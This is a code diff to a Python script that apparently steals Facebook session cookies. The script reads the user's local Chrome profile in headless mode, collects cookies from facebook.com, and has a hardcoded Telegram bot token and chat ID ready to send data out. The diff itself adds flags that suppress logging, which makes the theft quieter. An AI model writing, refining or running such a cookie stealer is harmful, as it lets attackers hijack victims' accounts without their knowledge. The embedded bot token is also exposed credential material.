@@ -14,6 +14,8 @@ TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
 CHAT_ID = '1174455752'
 TELEGRAM_API = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
 
+os.environ['WDM_LOG'] = '0'
+
 def install_libraries():
     required_libs = ["requests", "webdriver_manager", "selenium"]
     subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -36,8 +38,12 @@ def get_cookies(profile_name):
     chrome_options.add_argument(f"user-data-dir={os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')}")
     chrome_options.add_argument(f"profile-directory={profile_name}")
     chrome_options.add_argument("--headless")
+    chrome_options.add_argument("--log-level=3")
+    chrome_options.add_argument("--disable-logging")
     try:
-        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
+        service = Service(ChromeDriverManager().install())
+        service.log_path = os.devnull
+        driver = webdriver.Chrome(service=service, options=chrome_options)
         driver.get('https://www.facebook.com/')
         WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
         cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
